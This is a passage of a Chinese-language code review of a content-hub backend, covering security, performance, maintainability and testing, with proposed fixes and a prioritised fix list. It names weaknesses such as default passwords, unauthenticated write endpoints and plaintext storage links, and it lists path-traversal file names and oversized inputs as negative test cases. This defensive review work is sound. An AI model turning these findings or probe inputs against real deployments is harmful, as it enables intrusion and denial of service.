            weak = {"contenthub", "contenthub123", "changeme", ""}
            if self.minio_secret_key in weak or not self.api_key:
                raise ValueError("prod 环境禁止使用默认凭据，且必须配置 CH_API_KEY")
        return self

# app/main.py 启动时 fail-fast
try:
    settings = Settings()
except ValidationError as exc:
    raise SystemExit(f"配置校验失败：{exc}") from exc
```

`.env` 加入 `.gitignore`（若有 git），并提供 `.env.example`。

### 4.4【中】MinIO 预签名 URL 指向容器内主机名，浏览器无法访问（功能 + 安全耦合）

`app/config.py:8` 的 `minio_endpoint` 同时用于 SDK 客户端（`storage.py:25`）和预签名（`storage.py:51-55`）。compose 设 `CH_MINIO_ENDPOINT: minio:9000`，签出来的 URL 是 `http://minio:9000/contenthub-publish/...`——**浏览器解析不了这个名字**，`AssetDetail.file_url`（`assets.py:239`、`:513`、`:623`）对用户全量失效。

且 `MinioStorage.__init__` 的 `secure: bool = False`（`storage.py:24`）在 `get_storage()`（`:105-110`）里从未被配置覆盖 → **永久明文 HTTP**，预签名 URL 与登录凭据走明文。

**改法**：区分内网 endpoint 与公网 endpoint。

```python
# config.py
minio_endpoint: str                     # SDK 用：minio:9000
minio_public_endpoint: str | None = None  # 预签名用：https://cdn.example.com
minio_secure: bool = False

# storage.py
class MinioStorage:
    def __init__(self, endpoint, access_key, secret_key, prefix,
                 secure=False, public_endpoint=None):
        self.client = Minio(endpoint, ..., secure=secure)
        self.public = (Minio(public_endpoint, ..., secure=True)
                       if public_endpoint else self.client)
    def presigned_get(self, zone, key, expires_seconds=3600):
        return self.public.presigned_get_object(self.buckets[zone], key,
                                                expires=timedelta(seconds=expires_seconds))
```

并把 MinIO 放在反向代理后面走 TLS（也可顺带统一做鉴权与限流）。

### 4.5【中】无 CORS 配置、无 CORS 策略声明

`app/main.py` 无 `CORSMiddleware`。当前前端经 nginx 同源反代（`docker-compose.yml` 的 `frontend:8080` → api），所以**暂时能用**；但这意味着任何跨源调用都被浏览器拒绝，未来拆域名即断，且没有一份显式策略可审。

**改法**：显式配置最小白名单（不要用 `allow_origins=["*"]` 配 `allow_credentials=True`，那是经典误配）：

```python
from fastapi.middleware.cors import CORSMiddleware
app.add_middleware(CORSMiddleware,
                   allow_origins=settings.cors_origins,   # 从配置读，默认 []
                   allow_credentials=False,
                   allow_methods=["GET", "POST", "PUT", "PATCH", "DELETE"],
                   allow_headers=["Content-Type", "X-API-Key", "X-Request-ID"])
```

### 4.6【中】依赖未锁定、无漏洞扫描、Dockerfile 以 root 运行

`pyproject.toml:6-22` 全是 `>=x,<y` 区间，**无 lock 文件**（`ls | grep lock` 无命中），构建不可重现。风险集中项：`playwright>=1.45`（捆绑 Chromium，历史 CVE 多）、`pillow>=10,<12`（图像解析 CVE 高频区）、`edge-tts`（非官方 Microsoft 接口，随时可能失效，属可用性风险而非安全）。

`Dockerfile:1-16`：`python:3.12-slim` 未固定 digest（`:1`），全程 `root`，`pip install` 无哈希校验，`CMD`（`:16`）在生产镜像里跑 `alembic upgrade head && python -m app.seed_recipes`——**迁移与应用同容器同权限**，回滚困难。

**改法**：

```dockerfile
FROM python:3.12-slim@sha256:<pin> AS base
RUN useradd -m -u 10001 app
# ...
COPY --chown=app:app . .
USER app
CMD ["uvicorn", "app.main:app", "--host", "0.0.0.0", "--port", "8000"]
```

迁移拆成独立 job/one-shot service；依赖用 `uv lock`/`pip-compile` 生成 `requirements.txt`（带哈希）并接 `pip-audit`（本地 pre-commit 即可，符合仓库"不用 CI"的约定）。

### 4.7【良】已确认无 SQL 注入 / 无命令注入（保留，勿改坏）

- **SQL 注入**：全仓查询均走 SQLAlchemy 表达式（`select(...).where(Asset.zone == zone)` 等），无字符串拼接 SQL。迁移里的 `op.execute`（`c3d9f1a02b47:36-40`、`:47-49`）使用字面量，无用户输入。**无风险**。
- **命令注入**：`media_attrs.py:49-54` 用 list 形式调用 `subprocess.run`，无 `shell=True`，`path` 作为独立 argv 传入；`path` 来自 `tempfile.mkstemp`（`:43`）或受控的 `tmp_path`（`assets.py:127`）→ **无注入**。唯一残留是 `assets.py:123-124` 把文件名后缀传给 `NamedTemporaryFile(suffix=...)`；`Path(...).suffix` 只会返回最后一个 `.` 之后的片段、不含路径分隔符，风险可忽略，但建议改成固定 `.bin` 更省心。
- `AssetExternalCreate.source_url` 用 `HttpUrl`（`schemas.py:83`）校验且**后端从不回取**（`assets.py:186-199` 只存值）→ 此处无 SSRF。真正的 SSRF 在 4.2。

---

## 5. 性能

### 5.1【高】`async def` 路由里做同步阻塞 IO：整个事件循环被卡住

`create_asset`（`assets.py:148`）、`create_initial_draft`（`:320`）、`derive_from_master`（`:371`）是 `async def`，但 `store_upload`（`:73`）内部全是同步阻塞调用：

| 位置 | 操作 | 阻塞时长 |
|---|---|---|
| `assets.py:85` | `await file.read(50MB+1)` | 读盘/内存拷贝 |
| `assets.py:89` | `data.decode("utf-8")` | 50MB 解码，纯 CPU |
| `assets.py:92` | `docx_text.extract_text(data)` | zip + XML 解析，纯 CPU |
| `assets.py:96` / `:114` | `storage.put` / `put_stream` | MinIO HTTP 往返 + 2GB 上行 |
| `assets.py:100` / `:127` | `media_attrs.extract_attrs` → Pillow 解码 50MB 图 / `subprocess.run(ffprobe, timeout=120)` | 最长 120s |
| `assets.py:109` / `:125` | `shutil.copyfileobj` | 2GB 磁盘拷贝 |
| `assets.py:171` / `:181` | `db.flush()` / `db.commit()` | 同步 DB 往返 |

单个 2GB 视频上传会把**整个 ASGI 事件循环**独占数分钟：`/api/health`（`main.py:11`）不再响应，docker healthcheck（`docker-compose.yml` api.healthcheck）判死并重启容器，所有并发请求排队。这是本项目最严重的性能缺陷。

对照：`render_cover_for_master`（`:449`）、`derive_text_for_master`（`:518`）、`derive_video_kit_for_master`（`:572`）都是 `def`（同步），FastAPI 会自动丢进 threadpool——**这三处是对的**，说明作者知道该模式，只是上传链路漏了。

**改法**（二选一，推荐 A）：

A. 把三个上传路由改成 `def`（同步），去掉 `await`：

```python
@router.post("", status_code=201, response_model=AssetOut)
def create_asset(                                  # async → def，进 threadpool
    zone: AssetZone = Form(...),
    ...
):
    ...
    text, attrs = store_upload(storage, zone, key, file, ct)   # 去掉 await
```

并把 `store_upload` 内的 `await file.read(n)` 换成 `file.file.read(n)`（`UploadFile.file` 是同步 `SpooledTemporaryFile`）。

B. 保留 `async def`，把阻塞段显式下放线程池：

```python
from starlette.concurrency import run_in_threadpool
text, attrs = await run_in_threadpool(store_upload_sync, storage, zone, key, file, ct)
```

无论哪种，都需配合 2.3 缩短事务、并调大连接池：

```python
# app/db.py
engine = create_engine(settings.database_url, pool_pre_ping=True,
                       pool_size=20, max_overflow=20, pool_recycle=1800,
                       pool_timeout=30)
```

### 5.2【高】`render-cover` 每请求冷启动一个 Chromium，无并发闸门

`rendering.py:21-32`：每次调用 `sync_playwright()` → `p.chromium.launch()` → 渲染 → `browser.close()`。冷启动约 300ms–1s，单实例内存 ~150MB+。`assets.py:449` 是同步路由 → FastAPI 默认 threadpool 上限 40（anyio）→ **最多 40 个 Chromium 同时启动** → 约 6GB 内存 + CPU 打满。

**改法**：浏览器复用 + 信号量限流。

```python
# rendering.py
import threading
_sem = threading.BoundedSemaphore(2)      # 全局最多 2 个并发渲染

def screenshot(html_text, width, height):
    if not _sem.acquire(timeout=15):
        raise RuntimeError("渲染排队超时，请稍后重试")   # 由路由映射为 503
    try:
        ...  # 现有逻辑
    finally:
        _sem.release()
```

更彻底：常驻一个 Playwright browser 实例（模块级单例 + 锁），每次只开新 context。注意 `sync_playwright` 不能跨线程复用，需为每个 thread 维护实例或改用 async API。

### 5.3【中】video-kit 把整包 zip 在内存里拼两遍

`assets.py:601-615`：

```python
buf = io.BytesIO()
with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
    zf.writestr("audio.mp3", mp3)          # mp3 已在内存（speech.py:19 bytearray）
    ...
storage.put(AssetZone.PUBLISH.value, key, buf.getvalue(), "application/zip")  # :615 又拷一份
```

zip 内容是**已压缩**的 mp3，再 `ZIP_DEFLATED` 是纯浪费 CPU。长文（如 5000 字）合成长音频可达数百 MB，峰值内存 ≈ `mp3` + `buf` + `buf.getvalue()` 三份。

**改法**：

```python
with zipfile.ZipFile(buf, "w", zipfile.ZIP_STORED) as zf:   # mp3 无需再压
    ...
buf.seek(0)
storage.put_stream(AssetZone.PUBLISH.value, key, buf, buf.getbuffer().nbytes,
                   "application/zip")
```

并对合成长度设上限（如正文 > 2 万字直接 422），避免一次 TTS 拉爆内存与配额。

### 5.4【中】`get_asset` 触发两次懒加载查询，未用 `selectinload`

`assets.py:234-237`：

```python
asset = get_asset_or_404(db, asset_id)              # 1 次主查询
detail = AssetDetail.model_validate(asset)          # from_attributes 触发 upstream/downstream 懒加载
detail.upstream = [DerivationOut.model_validate(d) for d in asset.upstream]     # 2 次
detail.downstream = [DerivationOut.model_validate(d) for d in asset.downstream] # 3 次
```

合计 3 次往返，且 `derived_asset_id` 无索引（2.2）时其中一次是全表扫。

**改法**：

```python
from sqlalchemy.orm import selectinload

def get_asset_or_404(db: Session, asset_id: uuid.UUID, *, with_links: bool = False) -> Asset:
    if not with_links:
        asset = db.get(Asset, asset_id)
    else:
        asset = db.scalar(
            select(Asset).where(Asset.id == asset_id)
            .options(selectinload(Asset.upstream), selectinload(Asset.downstream)))
    if asset is None:
        raise HTTPException(404, f"资产不存在：{asset_id}")
    return asset
```

### 5.5【中】导入器逐文件 `SELECT`，N 次查询

`importer/obsidian.py:86-93`：对每个文件执行 `db.scalar(select(Asset).where(Asset.source_path == rel))`。几千条笔记 = 几千次往返。

**改法**：进入循环前一次性取回集合。

```python
existing = set(db.scalars(select(Asset.source_path).where(Asset.source_path.isnot(None))))
...
if rel in existing:
    result.skipped += 1
    continue
```

### 5.6【低】`duplicate_report` 是 O(n²) 的 `SequenceMatcher`

`importer/obsidian.py:123-150`：对 MASTER 区两两比对，n=2000 时为 200 万次 `SequenceMatcher`，单次耗时毫秒级 → 分钟级。脚本可接受，但建议先按标题长度/首字做分桶预筛。

---

## 6. 可维护性

### 6.1【高】5 处近乎逐行重复的"派生落库"块

抽样对照（`assets.py`）：

```python
# :340-367 create_initial_draft
draft = Asset(zone=..., status=..., title=..., file_name=..., content_type=..., created_by=...)
db.add(draft); db.flush()
key = f"{draft.id}/{file_name}"
try: text, attrs = await store_upload(...)
except HTTPException: db.rollback(); raise
draft.text_content = text; _merge_attrs(draft, attrs); draft.object_key = key
db.add(Derivation(source_asset_id=topic.id, derived_asset_id=draft.id, note=..., created_by=...))
db.commit(); db.refresh(draft)
detail = AssetDetail.model_validate(draft); detail.upstream = [...]

# :386-414 derive_from_master       ← 同构
# :495-514 render_cover_for_master   ← 同构（无上传，改 storage.put）
# :545-558 derive_text_for_master    ← 同构（无对象）
# :607-623 derive_video_kit_for_master ← 同构
```

差量只在 status / meta / 对象来源。这是本项目**最重的维护性债**：状态机会变更（`models.py:55-72` 已经改过一轮），5 处要同步改，漏一处即行为不一致。

**改法**：见 1.1 的 `_persist_derived` + `_detail`，预计 `assets.py` 从 624 行降到 ~430 行。

### 6.2【中】导入顺序与别名混用，读者需要猜测动机

`assets.py:27-28`：

```python
from ..rendering import render_html
from .. import rendering           # 又导入模块本身，仅为 :489 rendering.screenshot（便于 monkeypatch）
```

`assets.py:45-46` 同样双写：

```python
from .. import llm as llm_mod
from ..llm import LLMNotConfigured
```

`tests/test_render_cover_api.py:42-43` 依赖 `rendering.screenshot` 的模块级查找，所以这种写法**有原因**，但代码里没有注释说明。建议统一为"只 import 模块，用 `rendering.render_html(...)`"，并加一行注释说明这是为可测性刻意保留的间接层。

### 6.3【中】魔法数字散落

`assets.py:485-487`：

```python
"title_size": max(28, spec_dict["height"] // 12),
"subtitle_size": max(18, spec_dict["height"] // 20),
"padding": max(24, spec_dict["width"] // 18),
```

`rendering.py:26`：`device_scale_factor=2`；`rendering.py:29`：`wait_for_timeout(200)`；`speech.py:49`：`time.sleep(1)`、`attempts=3`；`importer/obsidian.py:123`：`threshold: float = 0.45`。

对比之下 `assets.py:50-51` 的 `MAX_UPLOAD_BYTES`/`INLINE_TEXT_LIMIT` 是好的示范（有名字、有注释）。**改法**：把上述渲染参数提到 `app/rendering.py` 顶部的具名常量并在 recipe `meta.variables`（`seed_recipes.py:70`）里暴露默认值。

### 6.4【中】`reviewed_by` 是死列，`source_url` 只在写入侧存在

- `models.py:109` + `schemas.py:54` 定义了 `reviewed_by`，但 `grep -rn "reviewed_by" app/ scripts/` 除这两处零命中 → 从未被写入，永远是 `null`。
- `source_url`（`models.py:105`）只在 `assets.py:193` 被写入一次，没有任何读取/展示/校验路径。

**改法**：要么实现审阅流（`PATCH /{id}/review`），要么在下个迁移里删列。保留不用的列会持续误导读代码的人。

### 6.5【低】SQLAlchemy 新旧风格混用

`seed_recipes.py:102`：

```python
exists = db.query(Recipe).filter_by(name=item["name"]).first()
```

全仓其余位置（`assets.py:212`、`recipes.py:44`、`meta.py:33`、`scripts/*`）都是 2.0 风格 `select()`。**改法**：`db.scalar(select(Recipe).where(Recipe.name == item["name"]))`。

### 6.6【低】`duplicate_report` 用 `id(obj)` 去重

`importer/obsidian.py:127-140` 用 Python 对象身份 `used: set[int]` 判重，语义上应基于 `Asset.id`。虽然 SQLAlchemy identity map 保证同 session 内同一行同一对象、当前不出错，但意图表达错误且 `x in used` 是 O(1) 哈希查找依赖对象存活。

**改法**：`used: set[uuid.UUID]`，用 `a.id`。

### 6.7【低】依赖注入未标注类型，丢失静态检查

`assets.py` 的 7 处 `storage=Depends(get_storage)`（`:154`、`:233`、`:303`、`:325`、`:378`、`:457`、`:577`）均无类型注解，而 `storage.py:12-19` 已经定义了 `ObjectStorage` Protocol —— 白准备了。**改法**：`storage: ObjectStorage = Depends(get_storage)`，mypy/pyright 即可校验 `presigned_get` 等签名。

### 6.8【低】注释密度高、质量好，但存在与代码不同步的风险

`store_upload`（`assets.py:75-84`）、`media_attrs` 各函数、`c3d9f1a02b47`（`alembic/versions/c3d9f1a02b47_m4_topic_stage.py:21-24`）的注释都解释了"为什么"，是显著的正面项。但注释里嵌了具体数值（"超 2GB"、"50MB 以下"），一旦常量调整（`assets.py:50-51`）注释即失真。**改法**：注释里引用常量名而非数值，例如"超 `MAX_UPLOAD_BYTES` 抛 413"。

---

## 7. 测试

### 7.1【高】测试脚手架要求活的 PostgreSQL，无法在无基础设施环境运行

`tests/conftest.py:34-59`：

```python
def _ensure_test_database(url) -> None:
    conn = psycopg.connect(host=url.host, port=url.port or 5432, user=url.username,
                           password=url.password, dbname="postgres", autocommit=True)
    ...
_ensure_test_database(_test_url)
engine = create_engine(TEST_URL, pool_pre_ping=True)
```

必须存在 `docker-compose.yml` 里那个 postgres（含密码 `contenthub`），否则**整个测试会话 collection 阶段直接崩**（模块级副作用 `:58`），连纯函数测试（`test_subtitles.py`、`test_media_attrs.py`、`test_llm.py`）都跑不了——它们本可以完全脱离 DB。

值得肯定的是 `conftest.py:27-31` 的库名守卫（拒绝在非 `contenthub_test` 上 drop/truncate），这个安全设计请保留。

**改法**：

```python
# tests/conftest.py —— 把 DB 依赖降级为按需 fixture，且失败可跳过
@pytest.fixture(scope="session")
def _engine():
    try:
        _ensure_test_database(_test_url)
        eng = create_engine(TEST_URL, pool_pre_ping=True)
        with eng.begin() as c:
            c.execute(text("CREATE EXTENSION IF NOT EXISTS pg_trgm"))
        yield eng
    except psycopg.OperationalError as exc:
        pytest.skip(f"需要 PostgreSQL 测试库（docker compose up -d postgres）：{exc}")

@pytest.fixture(scope="session", autouse=True)
def _schema(_engine):
    Base.metadata.drop_all(_engine); Base.metadata.create_all(_engine)
```

更彻底：用 `testcontainers` 或 `pytest-postgresql` 自动拉起，把"外部服务依赖"降为"自动供给"。

### 7.2【高】测试用 `create_all` 建表，4 个迁移从未被执行

`tests/conftest.py:66-67`：

```python
Base.metadata.drop_all(engine)
Base.metadata.create_all(engine)
```

于是 `test_models.py:91`、`:105` 断言的 `created_at.tzinfo is not None` **只验证了 models.py 的声明**，而没有验证 `2d5364b7040d:39-46` 与 `a98ff6f65060:24-27` 这两个 `alter_column` 是否真的生效。同理 `c3d9f1a02b47` 那段带 `autocommit_block` 的枚举新增 + 存量数据 `UPDATE`（`:25-40`）**零覆盖**。

这意味着：迁移写错 → CI/本地全绿 → 生产 `alembic upgrade head` 才炸。这是当前最大的质量盲区。

**改法**：加一个专门的迁移测试。

```python
# tests/test_migrations.py
import subprocess
import pytest

def test_upgrade_downgrade_roundtrip(_engine):
    """迁移必须能从零升到 head，且能在 head 与 base 间往返。"""
    from app.config import settings
    env = {**os.environ, "CH_DATABASE_URL": TEST_URL}
    for args in (["downgrade", "base"], ["upgrade", "head"],
                 ["downgrade", "base"], ["upgrade", "head"]):
        subprocess.run(["alembic", *args], check=True, env=env, capture_output=True)

def test_no_model_migration_drift(_engine):
    """autogenerate 必须为空 —— 模型与迁移一致（需 env.py 开 compare_type）。"""
    from alembic.autogenerate import compare_metadata
    from alembic.migration import MigrationContext
    from app.db import Base
    import app.models  # noqa: F401
    with _engine.connect() as conn:
        diff = compare_metadata(
            MigrationContext.configure(conn, opts={"compare_type": True}), Base.metadata)
    assert not diff, f"模型与迁移漂移：{diff}"
```

并把 `_schema` 改为基于 `alembic upgrade head`，让全部 API 测试都跑在"与生产同构"的 schema 上。

### 7.3【中】负例盲区清单（逐条对应本报告的高危项）

现有测试的失败路径覆盖其实不差（`test_assets_api.py:165-175` 损坏 docx 且断言无孤儿对象、`:203-210` 属性抽取失败隔离、`test_render_cover_api.py:79-94` 引擎故障 503、`test_video_kit_api.py:114-149` 音色/silence/空词序列），要肯定。但**以下高危路径零测试**：

| 未覆盖路径 | 对应缺陷 | 建议测试 |
|---|---|---|
| `spec='{"width":{}}'` / `spec='["a"]'` | 3.1 `TypeError`→500 | 断言 422，不是 500 |
| `spec` 超大尺寸（50000×50000） | 3.2 DoS | 断言 422 |
| `q="%"` / `q="a_b"` | 2.8 通配符 | 断言不返回全表 |
| 上传 >`MAX_UPLOAD_BYTES` | 3.6 | `monkeypatch MAX_UPLOAD_BYTES=16` → 断言 413 |
| 文件名 600 字符 / 含 `/`、`..` | 3.7 | 断言 422 或对象键被净化 |
| `storage.put` 抛异常 | 2.4 孤儿 | 断言 DB 无残留行 + 无孤儿对象 |
| `db.commit` 抛异常（`storage.put` 之后） | 2.4 | 断言孤儿被清理或返回 5xx 且一致 |
| `LLM` 返回 `{"choices":[]}` | 3.4 | 断言 502，不是 500 |
| 非 MASTER 资产调 `derive-text`/`derive-video-kit` | 1.4 | 断言 422 |
| `list_assets` 分页边界 `limit=0`/`offset` 越界 | 2.7 | 断言语义 |
| `list_assets` 响应不含 `text_content` | 2.1 | 断言字段集合 |
| 迁移 up/down 往返 | 7.2 | 见上 |
| `parse_frontmatter` 多行/列表值 | 3.10 | 断言预期降级行为 |
| `delete_asset` 对象删除失败 | 2.5 | 断言行已删 + warning 日志 |
| 任何写接口无 `X-API-Key` | 4.1 | 断言 401（上了鉴权之后） |

### 7.4【中】无覆盖率度量，盲区不可见

`pyproject.toml:37-44` 的 `[tool.pytest.ini_options]` 无 `--cov`，`dev` extras（`:25-28`）无 `pytest-cov`。19 个测试文件、约 130 个测试，但无人知道实际行覆盖。

**改法**：

```toml
[project.optional-dependencies]
dev = ["pytest>=8.0,<9.0", "pytest-cov>=5.0,<7.0", "httpx>=0.27,<1.0"]

[tool.pytest.ini_options]
addopts = "--cov=app --cov=scripts --cov-report=term-missing --cov-fail-under=85"
```

注意 `--cov-fail-under` 先设 70 起步，再逐步抬到 85，避免一次卡死开发。

### 7.5【低】`test_llm.py` 只断言 URL，`OpenAICompatLLM.complete` 的真实解析逻辑零覆盖

`tests/test_llm.py:24-29` 自己写了注释"不引入 pytest-httpx：直接断言 URL 组装与 payload 结构"，但**实际上只断言了 `llm.url` 一个字符串**，payload 结构与 `resp.json()` 解析完全没测。这正是 3.4 缺陷长期潜伏的原因。

**改法**：用 `monkeypatch.setattr(llm_mod.httpx, "post", fake_post)` 直接注入假响应，覆盖：正常响应、`choices: []`、`content: null`、非 JSON body、HTTP 429，各断言映射到 `LLMBadResponse`/`HTTPStatusError`。

---

## TOP 10 修复清单（按性价比排序）

| # | 修复项 | 解决什么 | 改动量 | 风险 | 收益 |
|---|---|---|---|---|---|
| **1** | **加日志 + 全局异常处理器 + request-id**（3.3） | 500 不可观测；三种错误响应形态 | 1 个文件 ~20 行 | 极低 | ★★★★★ 立刻让所有线上问题可定位，是后续一切修复的前提 |
| **2** | **上传链路改 `def`（进 threadpool）+ 缩短事务 + 调连接池**（5.1 / 2.3） | 2GB 上传卡死整个事件循环、healthcheck 误杀、池耗尽 | `assets.py` 3 处签名 + `db.py` 4 行 | 低（纯同步化） | ★★★★★ 消除最严重的可用性缺陷 |
| **3** | **`spec` 用 Pydantic 校验并限幅**（3.1 / 3.2） | 确定的 `TypeError`→500；80GB 位图 DoS | `schemas.py` + `assets.py` ~15 行 | 极低 | ★★★★★ 同时修掉一个已确认 bug 和一个 DoS |
| **4** | **列表接口去掉 `text_content` + 返回 `total`**（2.1 / 2.7） | 最坏 2.5GB 响应；无法分页 | 新增 `AssetListItem` + 路由 | 低（需前端同步） | ★★★★★ 立刻降低带宽/内存/DB 压力 |
| **5** | **写接口加 `X-API-Key` 鉴权 + 模板端点限管理员**（4.1 / 4.2 第 1 层） | 任何人可删资产、可提交恶意模板 | `security.py` 1 个新文件 + 各写接口 `dependencies=` | 低（需前端加 header） | ★★★★★ 当前是"完全裸奔"，这一步收益最高 |
| **6** | **补 3 个索引 + `selectinload`**（2.2 / 5.4） | `derived_asset_id` 全表扫；`updated_at` 排序无索引 | 1 个迁移 + `get_asset_or_404` | 低（大表建索引需注意锁，用 `CONCURRENTLY`） | ★★★★☆ 数据量一上来就是数量级差异 |
| **7** | **上传前置体积拦截 + 文件名净化**（3.6 / 3.7） | 磁盘可被写满；超长名致 commit 失败 + 孤儿 | 中间件 + `safe_file_name()` | 低 | ★★★★☆ 挡住低成本 DoS 与脏数据 |
| **8** | **测试改跑 `alembic upgrade head` + 加漂移检测 + `pytest-cov`**（7.2 / 7.4） | 4 个迁移零覆盖（含手写枚举+数据迁移）；覆盖率不可见 | `conftest.py` + 1 个新测试文件 | 中（会暴露现存问题，属好事） | ★★★★☆ 唯一能防止"生产迁移爆炸"的手段 |
| **9** | **抽 `_persist_derived` / `_detail` 消重**（1.1 / 6.1） | 5 处同构事务代码，改状态机必漏 | `assets.py` 内重构，~80 行 | 中（需回归测试护航，已有 22 个 assets 测试） | ★★★★☆ 后续所有改动成本直接下降 |
| **10** | **配置治理：无默认密码 + prod 启动校验 + MinIO 公网 endpoint/TLS**（4.3 / 4.4） | 公开默认凭据；预签名 URL 浏览器不可达 | `config.py` + `storage.py` | 中（需改部署配置） | ★★★★☆ 一次修掉安全问题 + 一个已坏掉的功能 |

**明确不建议现在做的**（避免过度重构）：不要立刻引入 repository/UoW 模式或更换 ORM 抽象；不要在无测试护航时把 `store_upload` 大卸八块。先做 1–3，再让 8 落地，然后再谈 9 的分层重构。

---

## 附：值得保留的既有优点

审查中发现的正面设计，重构时不要改坏：

1. `app/rendering.py:5-8` 用 `SandboxedEnvironment` 而非 `Environment` 渲染不可信模板 —— 主动防御 SSTI，方向完全正确。
2. `app/media_attrs.py` 的"失败隔离"设计：属性抽取失败绝不影响上传（`:126-142`），且有专门测试守护（`tests/test_media_attrs.py:97-104`）。
3. `app/routers/assets.py:83` 的"小文件先抽取后落盘"，避免损坏 docx 留下孤儿对象，并有 `test_assets_api.py:165-175` 断言 `fake.objects == {}` 验证。
4. `tests/conftest.py:27-31` 的测试库名守卫，拒绝在非 `contenthub_test` 上执行破坏性 SQL。
5. `alembic/versions/c3d9f1a02b47_m4_topic_stage.py:21-31` 对 PG 枚举 `ALTER TYPE ... ADD VALUE` 必须在 `autocommit_block` 内、且不能在同事务引用新值的处理，注释解释到位，是高质量迁移。
6. `app/llm.py`、`app/storage.py`、`app/speech.py` 都提供了 Protocol/Fake 双实现（`storage.py:12-19`、`:66-93`；`llm.py:47-57`），测试不依赖外部服务 —— 这个可测性架构应继续保持。
7. 中文注释密度高、解释"为什么"而非"做了什么"，显著降低新人的理解成本。

---

## 变更记录

| 版本 | 日期 | 变更 | 更新人 |
|------|------|------|--------|
| 1.0 | 2026-09-24 | 初版后端审查附页（随 QA-REV-001 同期审查） | zhoudabo |
| 1.1 | 2026-10-27 | 收录入文档治理：编号 QA-REV-002、补 frontmatter（reviews/ → quality/） | zhoudabo |
